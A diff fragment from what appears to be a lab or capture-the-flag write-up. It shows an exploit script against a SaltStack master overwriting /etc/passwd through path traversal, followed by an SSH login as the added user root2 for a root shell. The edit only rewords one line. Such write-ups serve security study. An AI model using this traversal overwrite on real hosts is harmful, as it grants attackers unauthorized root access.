@@ -104,7 +104,7 @@ $ python3 48421.py --master 192.168.242.62 --port 4506 --upload-src passwd --upl
 [+] Attemping to upload passwd to ../../../../../etc/passwd on 192.168.242.62
 [ ] Wrote data to file /srv/salt/../../../../../etc/passwd
 ```
-login via ssh with the new user root2  
+login via ssh with the new user root2 and the password we just created    
 And we got the root shell
 ```
 $ ssh root2@192.168.242.62  
